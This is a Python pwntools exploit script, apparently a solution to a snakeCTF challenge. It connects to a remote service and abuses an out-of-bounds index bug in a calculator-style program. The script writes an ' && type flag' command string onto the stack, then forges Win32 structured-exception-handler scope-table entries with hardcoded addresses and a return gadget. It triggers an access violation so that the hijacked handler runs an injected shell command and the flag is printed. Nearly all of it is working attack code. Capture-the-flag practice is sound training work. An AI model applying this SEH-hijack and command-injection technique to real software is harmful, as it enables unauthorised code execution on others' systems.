#!/usr/bin/env python3
# https://www-user.tu-chemnitz.de/~heha/hsn/chm/Win32SEH.chm/

from pwn import *

r = remote(args.HOST, args.PORT, ssl=args.SSL)

# stack buf base: 0x50fec0

def set_idx(idx, val):
    r.sendline(b"1")
    r.sendline(str(val).encode())
    r.sendline(b"0")
    r.sendline(str(idx + 1).encode())
    r.sendlineafter(b"(+, -, *, /): ", b"+")


def bug(val):
    r.sendline(b"1")
    r.sendline(str(val).encode())
    r.sendline(b"0")
    r.sendline(b"-2147483647")
    r.sendlineafter(b"(+, -, *, /): ", b".")


def print_results():
    r.sendline(b"2")


set_idx(0, u32(b" && "))
set_idx(1, u32(b"type"))
set_idx(2, u32(b" fla"))
set_idx(3, u32(b"g".ljust(4, b"\x00")))

print_results()

set_idx(9, 1)  # goto ScopeTable[1]
set_idx(10, 0x4012F0)  # try level 0
set_idx(11, 0x41414141) # cause access violation
set_idx(12, 2) # goto ScopeTable[2]
set_idx(13, 0x4012F0)  # use the appropriate filter, now with 0xc0000005 as exc. code
set_idx(14, 0) # that filter path retuns EXCEPTION_CONTINUE_SEARCH, so goto next level 
set_idx(15, 0xFFFFFFFF) # final level
set_idx(16, 0x7BD799C0)  # gadget to always ret 1
set_idx(17, 0x401298) # the actual handler that will cause the cmd. injection

bug(0x50FE8C + 4 * 9)

log.success(r.recvregex(b"snakeCTF{.*}", capture=True).group(0).decode())
